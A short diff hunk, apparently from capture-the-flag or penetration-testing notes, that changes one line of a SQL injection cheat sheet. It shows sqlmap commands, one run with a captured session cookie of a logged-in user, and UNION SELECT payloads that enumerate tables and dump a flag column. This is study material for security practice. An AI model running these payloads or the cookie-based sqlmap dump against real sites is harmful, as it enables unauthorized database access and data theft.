@@ -205,6 +205,6 @@ $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME
 OR
 -/?id=4 UNION SELECT 1,2--
 -/?id=4 UNION SELECT null, table_name FROM information_schema.tables--
--/?id=4 UNION SELECT null, flag FROM flags--
+-/?id=4 UNION SELECT null, main FROM mains--
 OR
 sqlmap -u "http://example.com/?id=4" --dump
